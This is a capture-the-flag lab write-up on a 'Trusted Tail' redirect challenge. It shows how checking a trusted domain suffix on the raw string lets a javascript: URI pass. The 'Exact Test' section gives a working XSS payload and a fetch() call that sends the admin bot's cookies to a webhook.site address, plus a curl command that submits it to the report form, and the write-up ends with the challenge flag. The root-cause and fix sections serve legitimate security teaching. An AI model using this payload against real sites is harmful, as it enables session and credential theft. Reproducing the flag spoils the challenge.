# Trusted Tail Suffix Allowlist JavaScript URI XSS

## What Is Happening

The [Trusted Tail lab](https://f194872f17ec.pwnbox-lab.com/) accepts a redirect target in `?l=` and claims it only forwards to trusted `.pwnbox-lab.com` domains. It also provides a report flow that makes an admin review a supplied same-origin URL.

In practice, the redirect validation trusts the tail of the **entire string**, not the parsed host. That allows a crafted `javascript:` URI to pass the checks and execute code when assigned to `location.href`.

## Why It Happens

`main.js` performs two weak checks:

1. It accepts any parameter value containing the substring `https:`:

```javascript
(v.indexOf("https:") > -1) ? p[k] = v : void 0;
```

2. It parses the host only if the value starts with `http://` or `https://`. Otherwise it validates the raw string:

```javascript
var n = /^https?:\/\//i.test(e) ? (new URL(e)).host : e;
return [".pwnbox-lab.com"].some((e) => n.endsWith(e));
```

This means the following payload passes:

```text
javascript:alert(1)//https:.pwnbox-lab.com
```

Validator view:

```text
contains https:            -> yes
raw string endsWith suffix -> yes
```

Browser behavior:

```text
location.href = javascript:...
-> execute JavaScript
```

## Exact Test

Direct proof of XSS:

```text
https://f194872f17ec.pwnbox-lab.com/?l=javascript:alert(1)//https:.pwnbox-lab.com
```

Admin-bot exfil payload:

```text
https://f194872f17ec.pwnbox-lab.com/?l=javascript:fetch('https://webhook.site/[uuid]?c='+encodeURIComponent(document.cookie))//https:.pwnbox-lab.com
```

Report it:

```bash
curl -sS -X POST "https://f194872f17ec.pwnbox-lab.com/" \
  -d "url=https://f194872f17ec.pwnbox-lab.com/?l=javascript%3Afetch%28%27https%3A//webhook.site/[uuid]%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%29//https%3A.pwnbox-lab.com"
```

## Expected Signal

- A plain external destination is rejected.
- A `javascript:` payload that includes `https:` and ends with `.pwnbox-lab.com` is accepted by the client logic.
- The report form accepts the same-origin wrapper URL.
- The admin bot visits the wrapper URL and the webhook receives the cookie.

## Result Interpretation

Confirmed bug chain:

```text
weak substring scheme gate
-> suffix allowlist applied to raw non-HTTP string
-> javascript: URI survives validation
-> location.href executes attacker code
-> admin bot cookie exfiltration
```

## Root Cause

The redirector validates the wrong component of the URL. It checks a trusted-looking suffix on the full string rather than parsing and validating the actual hostname and scheme.

## Impact

- JavaScript execution in the redirector page.
- Admin/support bot compromise when the bot reviews attacker-supplied same-origin links.
- Disclosure of non-HttpOnly cookies or other in-browser secrets.
- In real systems, possible credential theft, CSRF-like privileged actions, or admin data extraction.

## Fix

- Parse the candidate with `new URL()` unconditionally.
- Allow only explicit protocols such as `https:`.
- Validate `hostname`, not the whole string.
- Reject `javascript:`, `data:`, and similar active schemes.
- Consider using safe redirect helpers instead of direct `location.href` assignment from user input.

## Key Lesson

If a redirector checks `endsWith()` on the destination string, test whether the application is validating the **host** or just the visible tail. A trusted suffix at the end of a `javascript:` URI is still a `javascript:` URI.

## Flag

`pwnbox{e6f9b1d02eb54e239f12cbbee34b51aa}`
